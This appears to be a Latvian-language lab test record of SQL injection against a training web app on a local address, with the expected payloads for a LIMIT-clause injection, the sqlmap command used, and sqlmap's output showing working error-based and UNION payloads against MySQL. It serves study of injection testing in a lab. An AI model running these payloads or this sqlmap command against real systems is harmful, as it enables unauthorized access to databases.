=================================================================================
1. Īpašība: tiek injicēts “LIMIT” klauzulā 
2. Nepiciešams tampering: nē
3. Sagaidāmais rezultāts: 
3.1. boolean-based: -
3.2. error-based: ?limit=3 '
3.3. time-based: -
3.4. union: ?limit= 3 union select 1,2,3
4. Reālais rezultāts: redzams zemāk
5. Vidējais risinājuma ilgums: 74845377 nanosekundes
6. Palaistā komanda
sqlmap -u "http://192.168.17.134/sqlinjection/example5/?limit=3" -p limit --risk=3 --level=5


7. Jautājumi, kurus uzdeva SQLMap
7.1. it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
7.2. GET parameter 'limit' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
=================================================================================
sqlmap identified the following injection point(s) with a total of 2265 HTTP(s) requests:
---
Parameter: limit (GET)
    Type: error-based
    Title: MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)
    Payload: limit=3 PROCEDURE ANALYSE(EXTRACTVALUE(3141,CONCAT(0x5c,0x716a627671,(SELECT (CASE WHEN (3141=3141) THEN 1 ELSE 0 END)),0x7170787171)),1)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: limit=3 UNION ALL SELECT NULL,CONCAT(0x716a627671,0x6176794744524a597146686c537874624263444f79437871656143414f726b61725a61564c464967,0x7170787171),NULL-- -
---
web server operating system: Linux Debian 6 (squeeze)
web application technology: Apache 2.2.16
back-end DBMS: MySQL >= 5.1
